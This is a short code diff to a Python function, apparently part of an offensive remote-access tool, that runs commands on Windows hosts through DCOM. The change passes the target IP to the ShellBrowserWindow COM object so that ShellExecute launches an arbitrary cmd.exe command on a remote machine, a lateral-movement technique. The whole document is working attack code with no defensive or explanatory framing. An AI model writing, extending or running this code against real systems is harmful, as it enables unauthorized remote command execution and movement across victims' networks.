@@ -24,8 +24,9 @@ def dcom_execute(protocol, target_ip, command):
         protocol.send('[-] DCOM execution is Windows-only')
         return
     ps_cmd = (
-        f'[Activator]::CreateInstance([Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880"))'
-        f'.Document.Application.ShellExecute("cmd.exe","/c {command}","C:\\\\Windows\\\\System32",$null,0)'
+        f'$o=[Activator]::CreateInstance([Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880",'
+        f'"{target_ip}"));'
+        f'$o.Document.Application.ShellExecute("cmd.exe","/c {command}","C:\\\\Windows\\\\System32",$null,0)'
     )
     try:
         result = subprocess.run(
